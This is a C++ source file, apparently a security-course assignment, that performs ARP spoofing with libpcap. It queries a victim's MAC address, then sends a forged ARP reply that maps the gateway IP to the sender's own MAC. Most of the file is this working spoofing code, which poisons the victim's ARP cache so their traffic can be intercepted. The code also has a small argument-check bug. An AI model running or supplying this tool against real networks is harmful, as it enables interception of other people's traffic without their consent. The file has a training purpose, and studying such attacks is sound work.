#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "my_class.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
int send_arp_packet(int type, char* dev, Mac eth_dmac, Mac eth_smac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if(type == 1)
        packet.arp_.op_ = htons(ArpHdr::Request);
    else if (type==2)
        packet.arp_.op_ = htons(ArpHdr::Reply);
    else{
        printf("worng type error : [1]Request [2]Reply \n");
        return 1;
    }
    packet.arp_.smac_ = Mac(arp_smac);
    packet.arp_.sip_ = htonl(Ip(arp_sip));
    packet.arp_.tmac_ = Mac(arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arp_tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return 0;
}

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> ... \n");
    printf("sample: send-arp-test wlan0 192.168.~.~ 192.168.~.~ \n");
}

int main(int argc, char* argv[]) {

    char track[] = "개발";
    char name[] = "임창현";
    printf("[bob10][%s]send-arp[%s]\n", track, name);

    if (argc < 3) {
        usage();
        return -1;
    }

    // Take argv
    char* dev = argv[1];
    Ip sender_ip = Ip(argv[2]); //victim ip
    Ip target_ip = Ip(argv[3]); //gateway ip
    Mac what_mac = Mac::broadcastMac();
    Mac tmac = Mac::nullMac();
    Mac my_mac = Mac(getmac());
    Ip my_ip = Ip(getip(dev));

    send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, sender_ip);
    printf("sending arp request packet success!!\n");

    Mac sender_mac = Mac(receive_arp_packet(dev));
    printf("received arp packet!!\n");

    send_arp_packet(2, dev, sender_mac, my_mac, my_mac, target_ip, sender_mac, sender_ip);
    printf("sending arp reply packet success!!\n");
}
